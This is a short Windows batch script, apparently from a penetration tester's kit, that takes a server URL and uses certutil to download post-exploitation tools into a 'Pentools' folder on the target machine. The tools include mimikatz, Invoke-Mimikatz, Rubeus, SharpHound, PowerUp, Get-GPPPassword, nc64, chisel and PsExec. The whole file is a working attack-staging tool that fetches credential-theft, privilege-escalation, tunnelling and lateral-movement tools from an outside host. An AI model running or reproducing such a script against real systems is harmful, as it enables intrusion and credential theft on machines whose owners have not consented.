@echo off

if "%1"=="" (
  echo Usage: wintools.bat http:/ip:port
  exit /b 1
)

set URL=%1
set FOLDER=Pentools

if not exist "%FOLDER%" mkdir "%FOLDER%"
cd "%FOLDER%"

set FILES="accesschk64.exe" "admin.txt" "chisel.exe" "Eula.txt" "generic.txt" "Get-GPPAutologon.ps1" "Get-GPPPassword.ps1" "Get-System.ps1" "Invoke-Mimikatz.ps1" "Invoke-Portscan.ps1" "Invoke-ReverseDnsLookup.ps1" "mimikatz64.exe" "nc64.exe" "PowerUp.ps1" "PowerView.ps1" "Procmon64.exe" "PsExec64.exe" "Rubeus.exe" "Seatbelt.exe" "sharepoint.txt" "SharpHound.exe" "SharpHound.ps1"

for %%i in (%FILES%) do (
  certutil -urlcache -split -f %URL%/%%i %%i

  echo got %%i
)

echo Papi... Files downloaded successfully
